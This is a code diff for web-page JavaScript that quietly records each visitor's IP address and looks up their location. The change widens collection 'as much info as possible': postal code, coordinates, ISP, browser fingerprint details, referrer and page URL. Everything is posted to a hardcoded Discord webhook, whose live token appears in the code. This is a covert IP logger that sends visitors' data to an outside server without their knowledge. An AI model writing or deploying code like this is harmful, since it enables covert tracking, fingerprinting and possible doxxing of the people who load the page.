@@ -120,14 +120,36 @@
           fetch(`https://ipapi.co/${ip}/json/`)
             .then(res => res.json())
             .then(loc => {
-              const location = `${loc.city || 'Unknown City'}, ${loc.region || 'Unknown Region'}, ${loc.country_name || 'Unknown Country'}`;
+              // Gather as much info as possible
+              const info = {
+                IP: ip,
+                City: loc.city || 'Unknown',
+                Region: loc.region || 'Unknown',
+                Country: loc.country_name || 'Unknown',
+                Postal: loc.postal || 'Unknown',
+                Latitude: loc.latitude || 'Unknown',
+                Longitude: loc.longitude || 'Unknown',
+                Timezone: loc.timezone || 'Unknown',
+                Org: loc.org || 'Unknown',
+                ASN: loc.asn || 'Unknown',
+                UserAgent: navigator.userAgent,
+                Platform: navigator.platform,
+                Language: navigator.language,
+                Languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                Screen: `${window.screen.width}x${window.screen.height}`,
+                ColorDepth: window.screen.colorDepth,
+                Referrer: document.referrer || 'None',
+                PageURL: window.location.href,
+                Time: new Date().toString(),
+              };
+              let content = Object.entries(info).map(([k, v]) => `${k}: ${v}`).join('\n');
               fetch("https://discord.com/api/webhooks/1373486407003410535/lhcVD6g5_yLhXzLvg9P25Bx72CrSk5BA3Gts1dhU8FnnGPv6zTlii0XI2Jo6Uo6nN-4B", {
                 method: "POST",
                 headers: {
                   "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                  content: `IP: ${ip}\nLocation: ${location}`
+                  content: content
                 })
               });
             });
